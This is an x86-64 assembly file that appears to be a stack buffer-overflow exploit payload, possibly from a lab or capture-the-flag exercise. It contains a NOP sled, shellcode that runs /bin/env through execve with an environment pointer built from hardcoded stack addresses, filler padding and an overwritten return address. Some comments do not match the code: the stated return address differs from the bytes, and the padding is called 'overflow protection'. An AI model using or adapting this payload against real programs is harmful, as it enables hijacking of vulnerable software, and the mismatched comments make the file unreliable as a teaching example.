section .text
global _start

_start:
    ; NOP sled
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop

    ; Shellcode to execute /bin/env
    xor rax, rax                  ; Clear RAX
    push rax                      ; Push NULL byte
    mov rax, 0x766e652f6e69622f   ; "/bin/env" string
    push rax                      ; Push string to stack
    mov rdi, rsp                  ; Set RDI to point to the string
    xor rax, rax                  ; Clear RAX
    push rax                      ; Push NULL terminator
    push rdi                      ; Push pointer to /bin/env
    mov rsi, rsp                  ; Set RSI to point to arguments
    xor rdx, rdx                  ; Clear RDX (no environment variables)
    mov dx, 0x7fff                ; Partial environment address
    shl rdx, 32                   ; Shift to form 64-bit address
    mov ecx, 0xf7fbe6ff           ; Partial stack address
    xor cl, cl                    ; Clear lower byte of ECX
    or rdx, rcx                   ; Combine RDX and RCX
    mov rdx, [rdx]                ; Dereference RDX for environ
    mov al, 0x3b                  ; Syscall for execve
    syscall                       ; Execute syscall

    ; Exit syscall
    xor rdi, rdi                  ; Set RDI to 0
    mov al, 0x3c                  ; Syscall for exit
    syscall                       ; Execute syscall

    ; Padding for overflow protection
    times 48 db 0xFF              ; 48 bytes of padding (0xFF)

    ; Correct return address (0x7fffffffdeb8 in little-endian format)
    db 0x40, 0xdf, 0xff, 0xff, 0xff, 0x7f
